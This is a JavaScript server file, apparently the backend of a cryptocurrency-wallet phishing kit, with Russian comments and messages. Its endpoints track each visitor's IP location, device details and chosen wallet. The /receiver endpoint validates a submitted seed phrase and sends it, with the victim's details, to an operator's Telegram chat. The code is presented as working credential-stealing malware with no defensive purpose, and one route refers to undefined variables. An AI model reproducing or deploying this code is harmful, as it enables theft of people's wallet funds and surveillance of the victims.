import walletsConfig from "../../wallets_config.json" assert { type: "json" };
import requestConfig from "../../request_config.json" assert { type: "json" };
import UAParser from "ua-parser-js";
import { validateMnemonic } from "bip39";
import { Telegraf } from "telegraf";
import dotenv from 'dotenv';

dotenv.config();
const wallets = walletsConfig.wallets;
const config = requestConfig;

const bot = new Telegraf(process.env.TOKEN);
const chatId = process.env.CHAT_ID;

//проверка ip
const checkIp = async (ip) => {
    const response = await fetch(
        `https://ipwho.is/${ip}`,
        {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            },
        }
    )

    const data = await response.json();

    return {
        ip: data.ip,
        city: data.city,
        country: data.country
    }
}

export const main = async (server) => {
    
    //Проверка в заголовке Authorization наличие токена. Убираем какой-либо ответ при отсутствии токена.
    server.addHook('preHandler', async (request, reply) => {
        const authHeader = request.headers['authorization'];
        const token = authHeader ? authHeader.split(' ')[1] : undefined;
    
        if (!token) {
            return;
        }

        try {
            await server.jwt.verify(token);
        } catch (err) {
            reply.status(403).send({ error: 'Invalid token' });
        }
    });

    server.post("/user", async (request, reply) => {
        const { userData } = request.body;

        const deviceType = userData.ua.device?.type === 'mobile' ? userData.ua.device?.type : 'Desktop';
        const deviceInfo = deviceType === 'Desktop' ? `\`${deviceType}\`` : `\`${deviceType}\`, Модель: \`${userData.ua.device?.model || 'N/A'}\`, Производитель: \`${userData.ua.device?.vendor || 'N/A'}\``;

        await bot.telegram.sendMessage(chatId, `
👤 *Пользователь*:
- 🌐 *IP*: \`${clientData?.ip || 'N/A'}\`
- 🏙️ *Город*: \`${clientData?.city || 'N/A'}\`
- 🌎 *Страна*: \`${clientData?.country || 'N/A'}\`

📱 *Информация об устройстве*:
- 🖥️ *User Agent*: \`${result.ua}\`
- 🌐 *Браузер*: \`${result.browser.name}\`
- 💻 *ОС*: \`${result.os.name}\`
- 📱 *Устройство*: \`${deviceInfo}\`

Открыл вкладку.
`, { parse_mode: 'Markdown' });
})

    server.post("/chosenwallet", async (request, reply) => {
        const { userData, wallet } = request.body;

        const deviceType = userData.ua.device?.type === 'mobile' ? userData.ua.device?.type : 'Desktop';
        const deviceInfo = deviceType === 'Desktop' ? `\`${deviceType}\`` : `\`${deviceType}\`, Модель: \`${userData.ua.device?.model || 'N/A'}\`, Производитель: \`${userData.ua.device?.vendor || 'N/A'}\``;

        await bot.telegram.sendMessage(chatId, `
👤 *Пользователь*:
- 🌐 *IP*: \`${userData.client.ip || 'N/A'}\`
- 🏙️ *Город*: \`${userData.client.city || 'N/A'}\`
- 🌎 *Страна*: \`${userData.client.country || 'N/A'}\`

📱 *Информация об устройстве*:
- 🖥️ *User Agent*: \`${userData.ua.ua}\`
- 🌐 *Браузер*: \`${userData.ua.browser.name}\`
- 💻 *ОС*: \`${userData.ua.os.name}\`
- 📱 *Устройство*: \`${userData.ua.device?.type || 'N/A'}\`, Модель: \`${userData.ua.device?.model || 'N/A'}\`, Производитель: \`${userData.ua.device?.vendor || 'N/A'}\`

Выбрал кошелек \`${wallet}\`.
`, { parse_mode: 'Markdown' });

        reply.status(200).send({status: 'ok'});
    });

    server.post("/selectseed", async (request, reply) => {
        const { userData, seedLength, wallet } = request.body;

        const deviceType = userData.ua.device?.type === 'mobile' ? userData.ua.device?.type : 'Desktop';
        const deviceInfo = deviceType === 'Desktop' ? `\`${deviceType}\`` : `\`${deviceType}\`, Модель: \`${userData.ua.device?.model || 'N/A'}\`, Производитель: \`${userData.ua.device?.vendor || 'N/A'}\``;

        await bot.telegram.sendMessage(chatId, `
👤 *Пользователь*:
- 🌐 *IP*: \`${userData.client.ip || 'N/A'}\`
- 🏙️ *Город*: \`${userData.client.city || 'N/A'}\`
- 🌎 *Страна*: \`${userData.client.country || 'N/A'}\`

📱 *Информация об устройстве*:
- 🖥️ *User Agent*: \`${userData.ua.ua}\`
- 🌐 *Браузер*: \`${userData.ua.browser.name}\`
- 💻 *ОС*: \`${userData.ua.os.name}\`
- 📱 *Устройство*: ${deviceInfo}

Выбрал кошелек \`${wallet}\` и количество слов в сид фразе \`${seedLength}\`.
`, { parse_mode: 'Markdown' });

    reply.status(200).send({status: 'ok'});

    });

    //Получаем список кошельков
    server.get("/wallets", async (request, reply) => {
        const parser = new UAParser();
        const ua = request.headers["user-agent"]
        const clientIp = request.headers['x-forwarded-for'] || request.ip;
        const clientData = await checkIp(clientIp);
    
        const result = parser.setUA(ua).getResult();

        reply.send({ wallets: wallets, requestConfig: config, user: {clientData, result} });
    });

    //Принимаем сид фразу и остальные данные
    server.post("/receiver", async (request, reply) => {
        const { seed, wallet, userData } = request.body;
        const isValid = validateMnemonic(seed);
        if (isValid) {
            const data = {
                seed: seed,
                wallet: wallet,
                ...userData
            }

            const deviceType = userData.ua.device?.type === 'mobile' ? userData.ua.device?.type : 'Desktop';
            const deviceInfo = deviceType === 'Desktop' ? `\`${deviceType}\`` : `\`${deviceType}\`, Модель: \`${userData.ua.device?.model || 'N/A'}\`, Производитель: \`${userData.ua.device?.vendor || 'N/A'}\``;

            await bot.telegram.sendMessage(chatId, `
📝 *Детали кошелька*:
- 💼 *Кошелек*: \`${data.wallet}\`
- 🔑 *Сид Фраза*: \`${data.seed}\`

👤 *Информация о пользователе*:
- 🌐 *IP*: \`${data.client.ip}\`
- 🏙️ *Город*: \`${data.client.city || 'N/A'}\`
- 🌎 *Страна*: \`${data.client.country || 'N/A'}\`

📱 *Информация об устройстве*:
- 🖥️ *User Agent*: \`${data.ua.ua}\`
- 🌐 *Браузер*: \`${data.ua.browser.name}\`
- 💻 *ОС*: \`${data.ua.os.name}\`
- 📱 *Устройство*: \`${deviceInfo}\`
                `, { parse_mode: 'Markdown' });                
            console.log(data)
            return { hello: "world" };
        } else {
            reply.status(400).send({ error: 'Invalid seed' });
            return;
        }
        
    });
};